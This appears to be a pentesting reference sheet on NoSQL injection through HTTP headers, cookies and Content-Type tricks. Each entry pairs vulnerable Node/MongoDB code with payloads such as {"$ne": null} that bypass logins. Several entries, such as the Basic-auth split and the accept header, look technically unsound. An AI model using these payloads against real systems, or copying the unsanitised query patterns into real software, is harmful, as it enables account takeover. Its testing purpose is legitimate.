# The header/cookie carriers — `x-filter`, `x-query`, `Cookie`

## The `x-filter`/`x-query`/`x-search` headers — the string-JSON

```javascript
const filter = JSON.parse(req.headers['x-filter'])
const filter = JSON.parse(req.headers['x-query'])
const filter = qs.parse(req.headers['x-filter'])
User.findOne(filter)
```

A header-JSON — `x-filter: {"user": {"$ne": null}}` — `injection-points.md`.

## The `Cookie` — the cookie-qs

```javascript
const filter = qs.parse(req.headers.cookie)
const filter = req.cookies.filter      — cookie-parser
const filter = JSON.parse(req.cookies.filter)
```

`Cookie: filter=user[$ne]=x` or `Cookie: filter={"$ne":null}` — the
cookie-carrier — `injection-points.md`.

## The `x-user`/`x-pass` headers — the credential-headers

```javascript
const user = req.headers['x-user']
const pass = req.headers['x-pass']
User.findOne({user, pass})
```

`x-user: {"$ne": null}` — a header-object — needs JSON.parse —
`injection-points.md`.

## The `authorization` — the auth-header

```javascript
const auth = req.headers.authorization  — "Basic base64(user:pass)"
const [user, pass] = atob(auth.split(' ')[1]).split(':')
```

`Authorization: Basic base64(user[$ne]:pass[$ne])` — the colon-split —
the base64 carrier — `injection-points.md`.

## The `x-api-key`/`x-token` — the token-headers

```javascript
const token = req.headers['x-token']
Token.findOne({token})
```

`x-token: {"$ne": null}` — the token-filter — `injection-points.md`.

## The `referer`/`x-forwarded-*` — the proxy-headers

```javascript
const ref = req.headers['x-forwarded-host']
Log.findOne({referer: ref})
```

`x-forwarded-*`/`referer`/`origin` — the proxy-header — `injection-points.md`.

## The `x-graphql`/`x-query` — the API-headers

```javascript
const query = req.headers['x-graphql']
db.users.findOne(JSON.parse(query))
```

The GraphQL/API header — `injection-points.md`.

## The `x-http-method-override` — the method-override

```javascript
const method = req.headers['x-http-method-override']
```

`x-http-method-override: PUT` — the method-override —
`update-injection.md` — the write-side reach.

## The `x-mongo-*` — the mongo-headers

```javascript
const filter = req.headers['x-mongo-filter']
const pipeline = JSON.parse(req.headers['x-mongo-pipeline'])
```

The `x-mongo-*` — `injection-points.md`.

## The `content-type` — the body-carrier

```text
Content-Type: application/json
{"user": {"$ne": null}}

Content-Type: application/x-www-form-urlencoded
user[$ne]=x&pass[$ne]=x

Content-Type: application/jwt
{"user": {"$ne": null}}

Content-Type: application/bson
<BSON bytes>

Content-Type: application/x-bson
<BSON bytes>
```

The `Content-Type` decides the parser — `carrier-json-deep.md`,
`carrier-qs-deep.md`.

## The `content-type` bypass — the JSON-in-form

```text
Content-Type: application/x-www-form-urlencoded
{"user": {"$ne": null}}
```

A JSON-body under a form-CT — the form-parser sees a string —
`filter-bypass.md` — the reverse: a form-body under JSON-CT is a
parse-failure.

## The `charset` — the encoding-header

```text
Content-Type: application/json; charset=utf-8
Content-Type: application/json; charset=iso-8859-1
Content-Type: application/json; charset=utf-16
```

The `charset` — the body's encoding — `filter-bypass.md` — a utf-16
body under a utf-8 parse-fails or is re-decoded.

## The `accept` — the response-shape

```javascript
const accept = req.headers.accept
```

`accept: application/json` — `injection-points.md`.

## The `host`/`x-forwarded-host` — the vhost

```javascript
const host = req.headers['x-forwarded-host']
Log.findOne({host})
```

`x-forwarded-host` — `injection-points.md`.

## The `user-agent` — the UA-field

```javascript
const ua = req.headers['user-agent']
Log.findOne({ua})
```

`user-agent` — `injection-points.md` — a UA-injection.

## The `x-request-id`/`x-correlation-id` — the trace-headers

```javascript
const id = req.headers['x-request-id']
Log.findOne({id})
```

The trace-headers — `injection-points.md`.

## The `x-custom-*` — the arbitrary-header

```javascript
for (const [k, v] of Object.entries(req.headers)) {
  if (k.startsWith('x-')) filter[k.slice(2)] = v
}
```

A `x-*`-to-filter loop — `whitebox-hunt.md` — grep for the pattern.
